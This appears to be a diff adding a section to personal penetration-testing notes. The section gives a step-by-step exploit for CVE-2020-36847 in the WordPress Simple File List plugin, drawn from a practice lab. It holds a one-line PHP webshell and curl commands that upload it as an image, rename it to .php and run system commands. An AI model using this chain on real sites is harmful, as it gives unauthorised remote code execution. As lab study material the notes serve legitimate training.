@@ -197,5 +197,53 @@ See [[09. Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2
 
 ---
 
+## WordPress Plugin Upload — Two-Step via Plugin Engine (CVE-2020-36847)
+
+Simple File List <= 4.2.2. Unauthenticated upload requests can fail with HTTP 500 unless the plugin-specific POST fields are supplied.
+
+**Step 1 — Create webshell:**
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.png
+```
+
+**Step 2 — Upload (all plugin fields required):**
+```bash
+curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
+  -F "file=@shell.png;type=image/png" \
+  -F "eeSFL_ID=1" \
+  -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \
+  -F "eeSFL_Timestamp=1587258885" \
+  -F "eeSFL_Token=<token>"
+# Token = plugin token used by the configured file list; it is visible on a page
+# rendering the [simple-file-list] shortcode. Response: SUCCESS
+```
+
+**Step 3 — Verify upload landed:**
+```bash
+curl -s -o /dev/null -w "%{http_code}" \
+  "http://$BoxIP/wp-content/uploads/simple-file-list/shell.png"
+# 200 = file is there; 404 = upload failed, do not attempt rename
+```
+
+**Step 4 — Rename `.png` to `.php`:**
+```bash
+curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
+  -H "X-Requested-With: XMLHttpRequest" \
+  -H "Referer: http://$BoxIP/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1" \
+  -d "eeSFL_ID=1&eeFileOld=shell.png&eeListFolder=/&eeFileAction=Rename|shell.php"
+# eeFileOld is the current filename (NOT oldFile/eeFilename/eeFile)
+# Literal | in eeFileAction — not %7C
+# eeSecurity nonce is NOT required on vulnerable 4.2.2 instances
+```
+
+**Step 5 — RCE:**
+```bash
+curl -s "http://$BoxIP/wp-content/uploads/simple-file-list/shell.php?cmd=id"
+```
+
+> Source: Nukem (PG Practice), [[WordPress - Simple File List Upload]]
+
+#### Tags: #WordPress #SimpleFileList #FileUpload #RCE #CVE202036847
+
 ## **Outstanding**
 This area grows alongside the modules. Whenever a new upload-bypass trick comes up (magic-byte/MIME spoofing, double extensions, polyglot files, etc), add it here with a link back to the source section.
